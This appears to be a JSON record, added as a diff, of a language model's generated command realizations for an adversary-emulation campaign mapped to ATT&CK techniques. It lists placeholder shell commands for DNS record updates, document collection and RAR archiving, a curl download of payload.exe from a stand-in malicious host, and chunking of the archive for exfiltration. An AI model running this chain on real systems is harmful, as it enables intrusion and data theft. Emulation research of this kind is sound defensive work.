@@ -1,0 +1,74 @@
+{
+  "campaign_id": "C0026",
+  "model": "qwen2.5-coder:14b",
+  "sample": 1,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-renewal",
+      "command": "nsupdate -k /path/to/keyfile <<EOF\nserver dns-server.example.com\nupdate add expired-domain.example.com 3600 A target-ip-address\nsend\nEOF",
+      "target": "actor.primary",
+      "parameters": {
+        "dns_server": "dns-server.example.com",
+        "domain": "expired-domain.example.com",
+        "ip_address": "target-ip-address",
+        "keyfile_path": "/path/to/keyfile"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "local-file-collection",
+      "command": "find /path/to/documents -type f -name '*.docx' -exec cp {} /path/to/collected_documents \\;",
+      "target": "target.primary",
+      "parameters": {
+        "source_directory": "/path/to/documents",
+        "destination_directory": "/path/to/collected_documents"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "winrar-archive",
+      "command": "winrar a -r /path/to/archive.rar /path/to/documents/*.docx -x@/path/to/exclude.txt",
+      "target": "target.primary",
+      "parameters": {
+        "archive_path": "/path/to/archive.rar",
+        "source_directory": "/path/to/documents",
+        "exclude_file": "/path/to/exclude.txt"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "http-download",
+      "command": "curl -o /path/to/payload.exe http://malicious-server.example.com/payload.exe",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "http://malicious-server.example.com/payload.exe",
+        "output_path": "/path/to/payload.exe"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "dynamic-dns-update",
+      "command": "nsupdate -k /path/to/keyfile <<EOF\nserver dns-server.example.com\nupdate add dynamic-domain.example.com 3600 A target-ip-address\nsend\nEOF",
+      "target": "actor.primary",
+      "parameters": {
+        "dns_server": "dns-server.example.com",
+        "domain": "dynamic-domain.example.com",
+        "ip_address": "target-ip-address",
+        "keyfile_path": "/path/to/keyfile"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "chunked-exfiltration",
+      "command": "split -b 3M /path/to/archive.rar /path/to/chunked_archive.part",
+      "target": "actor.primary",
+      "parameters": {
+        "archive_path": "/path/to/archive.rar",
+        "chunk_size": "3M",
+        "output_prefix": "/path/to/chunked_archive.part"
+      }
+    }
+  ]
+}
